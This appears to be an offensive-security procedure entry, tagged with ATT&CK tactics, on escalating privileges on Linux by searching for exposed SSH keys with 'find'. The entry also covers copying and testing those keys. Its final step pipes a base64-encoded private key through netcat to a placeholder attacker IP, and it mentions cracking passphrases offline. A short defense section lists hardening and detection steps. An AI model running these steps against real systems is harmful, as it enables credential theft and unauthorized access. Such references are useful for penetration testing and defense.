---
id: 8f008d9c-02dc-4bae-a955-24426ae60def
name: Linux-Privilege-Escalation-via-SSH-Key
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.584197+00:00'
updated_at: '2023-04-10T20:34:23.019374+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques: []
tags:
  - '[[tags/Linux - Privilege Escalation]]'
  - '[[tags/Sensitive files]]'
  - '[[tags/SSH Key]]'
commands:
  - '[[commands/find-authorized-keys-files]]'
  - '[[commands/find-id-rsa-private-keys]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-SSH-Key

## Summary

This procedure outlines how to search for SSH keys on a compromised Linux system to identify unsecured credentials that can be used for privilege escalation and establishing persistent access. By locating files like authorized_keys (public keys for authentication) and id_rsa (private keys), an attacker can impersonate privileged users or connect remotely without passwords, enabling lateral movement or backdoor creation.

## Description

SSH keys provide passwordless authentication and are commonly used for secure remote access on Linux systems. However, misconfigurations such as world-readable private keys or unauthorized public keys in user home directories can expose them to attackers with initial foothold access. This technique targets common storage locations like ~/.ssh/ but searches system-wide to find keys belonging to other users, including root or service accounts. Once discovered, private keys can be exfiltrated and used with tools like ssh to connect as the key owner, potentially escalating from a low-privilege shell to root if the key grants elevated access. This is particularly effective in environments with automated deployments or shared servers where keys are inadvertently left unsecured. The procedure assumes shell access and focuses on discovery, with follow-up actions like copying keys for offline use.

## Requirements

1. Low-privilege shell access to a Linux target system (e.g., via initial exploit or compromised user account).
2. Basic command-line proficiency and read access to most file system areas (permission errors are suppressed).
3. No external tools required; uses built-in 'find' command available on all standard Linux distributions.

## Defense

Defensive measures and detection strategies:

- Enforce strict file permissions on SSH directories (e.g., chmod 700 ~/.ssh, chmod 600 ~/.ssh/id_rsa) and regularly audit with tools like Lynis or custom scripts.
- Implement centralized SSH key management (e.g., using AWS SSM or HashiCorp Vault) to rotate and monitor keys automatically.
- Enable logging for SSH authentication failures and key usage via /var/log/auth.log; use tools like Fail2Ban or OSSEC for anomaly detection.
- Scan for exposed keys during vulnerability assessments with commands like 'find / -type f \( -name "*rsa" -o -name "authorized_keys" \) -perm -o+r 2>/dev/null' to identify overly permissive files.

## Objectives

1. Systematically search for and locate SSH public and private key files across the file system.
2. Identify keys with insecure permissions that can be read and exfiltrated for reuse.
3. Enable privilege escalation by using discovered keys to access higher-privilege accounts or persist remotely.

## Instructions

### Step 1: Search for Authorized Keys Files

**Context**: This step locates public key files (authorized_keys) that allow SSH authentication without passwords. These files, if readable, reveal users or services that can be impersonated by pairing with a corresponding private key.

**Command** ([[commands/find-authorized-keys-files]]):
```bash
find / -name authorized_keys 2>/dev/null
```

> The command starts from the root directory and searches for files named 'authorized_keys', suppressing permission-denied errors to keep output clean. It typically reveals locations like /home/user/.ssh/authorized_keys. If files are found, note their paths and check permissions with 'ls -la <path>' to confirm readability. Success here provides insight into configured SSH logins.

### Step 2: Search for Private Key Files

**Context**: Private keys (id_rsa) are the sensitive counterparts used for authenticating to systems listed in authorized_keys elsewhere. Discovering these allows direct SSH connections to other hosts or escalation if the key belongs to a privileged user.

**Command** ([[commands/find-id-rsa-private-keys]]):
```bash
find / -name id_rsa 2>/dev/null
```

> Similar to the previous command, this targets private keys named 'id_rsa' (common default for RSA keys). Output lists file paths; immediately copy readable ones (e.g., 'cp <path> /tmp/key_backup') for exfiltration. Test usability offline with 'ssh-keygen -y -f id_rsa' to extract the public key and match against known authorized_keys. If a matching pair is found, use 'ssh -i id_rsa user@target' for access.

### Step 3: Validate and Exfiltrate Keys

**Context**: After discovery, verify key viability and prepare for use. This ensures the keys are not corrupted or passphrase-protected, and facilitates their transfer to the attacker's machine for persistence.

**Instructions**: For each discovered key:
1. Check permissions and content: 'ls -la <key_path>' and 'head -5 <key_path>' (avoid full dump for private keys).
2. If readable, test locally: 'ssh-keygen -y -f <key_path>' (outputs public key if no passphrase).
3. Exfiltrate via available channels (e.g., 'base64 <key_path> | nc attacker_ip 4444' or upload to C2 server).

> Expected outcome: Usable keys that enable SSH without passwords. If passphrase-protected, note for offline cracking attempts using tools like John the Ripper.
